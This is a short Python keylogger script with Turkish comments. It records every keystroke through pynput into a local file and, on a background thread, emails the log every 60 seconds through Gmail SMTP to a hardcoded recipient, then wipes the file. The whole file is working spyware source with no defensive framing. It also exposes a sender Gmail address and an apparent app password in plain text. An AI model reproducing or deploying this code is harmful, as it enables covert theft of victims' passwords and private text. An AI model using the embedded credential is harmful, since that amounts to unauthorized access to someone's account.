from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading
import time

LOG_FILE = "keylog.txt"
SEND_INTERVAL = 60  # saniye

EMAIL = "tunomontana01@gmail.com"          # Gönderen mail (Python script’te login için)
PASSWORD = "eloj nmoc wtgl msfq "                 # Gmail app şifren
TO_EMAIL = "deooavm@gmail.com"       # Logları alacağın mail

def send_email():
    with open(LOG_FILE, "r") as f:
        content = f.read()

    if not content.strip():
        return

    msg = MIMEText(content)
    msg['Subject'] = "Keylogger Log"
    msg['From'] = EMAIL
    msg['To'] = TO_EMAIL

    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, TO_EMAIL, msg.as_string())
        server.quit()

        # Log gönderildikten sonra temizle
        open(LOG_FILE, "w").close()
        print("[+] Log mail olarak gönderildi.")
    except Exception as e:
        print(f"[!] Mail gönderilemedi: {e}")

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key.name}]")

def schedule_email():
    while True:
        time.sleep(SEND_INTERVAL)
        send_email()

if __name__ == "__main__":
    email_thread = threading.Thread(target=schedule_email, daemon=True)
    email_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
